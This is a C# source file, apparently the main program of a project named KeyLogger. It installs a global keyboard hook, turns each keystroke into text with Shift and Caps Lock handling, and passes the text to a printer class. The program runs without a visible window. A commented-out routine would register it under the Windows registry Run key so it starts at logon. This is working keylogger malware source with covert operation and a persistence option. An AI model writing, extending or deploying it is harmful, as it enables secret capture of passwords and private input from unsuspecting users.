using Microsoft.Win32;
using System;
using System.Collections;
using System.IO;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            GlobalKeyboardHook gHook = GlobalKeyboardHook.getInstance();
            // Declare a KeyDown Event
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            gHook.KeyUp += new KeyEventHandler(gHook_KeyUp);
            gHook.hook();
            TextPrinter.initialize();
            KeyboardStatus.initilize();
            hideForm();
        }

        // Handle the KeyDown Event
        public static void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            // Link to reference
            Hashtable keyMap = KeyboardTable.getInstance();
            Hashtable keyShiftMap = KeyboardTable.getShiftInstance();

            string str = "";

            // To detect Shift
            if (Control.ModifierKeys == Keys.Shift)
            {
                // To detect if it is char keys
                if (KeyboardStatus.getKeyCode() >= 65 && KeyboardStatus.getKeyCode() <= 90)
                    if (KeyboardStatus.getCapsFlag() == false)
                        str = keyMap[KeyboardStatus.getKeyCode()].ToString().ToUpper();
                    else
                        str = keyMap[KeyboardStatus.getKeyCode()].ToString();
                // To detect if it is shift + num keys
                else if (KeyboardStatus.getKeyCode() >= 48 && KeyboardStatus.getKeyCode() <= 57)
                    str = keyShiftMap[KeyboardStatus.getKeyCode()].ToString();
                else str = keyMap[KeyboardStatus.getKeyCode()].ToString();
            }
             // To detect CapsLock
            else if (KeyboardStatus.getCapsFlag() == true)
            {
                if (KeyboardStatus.getKeyCode() >= 65 && KeyboardStatus.getKeyCode() <= 90)
                    // Change upper case if capsFlag is true and the keycode is char key
                    str = keyMap[KeyboardStatus.getKeyCode()].ToString().ToUpper();
                else str = keyMap[KeyboardStatus.getKeyCode()].ToString();
            }
            else str = keyMap[KeyboardStatus.getKeyCode()].ToString();

            // Write !
           TextPrinter.print(str);
        }

        // Handle the KeyDown Event
        public static void gHook_KeyUp(object sender, KeyEventArgs e)
        {
            if (Control.ModifierKeys != Keys.Shift) KeyboardStatus.setShiftFlag(false);
        }


        /*
        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (isChecked)
            {
                registryKey.SetValue("ApplicationName", Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue("ApplicationName");
            }
        }
        */
    

        public static void hideForm()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Form1 TheForm = new Form1();
            Application.Run();
        }

        public void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
           TextPrinter.close();
        }

    }
}
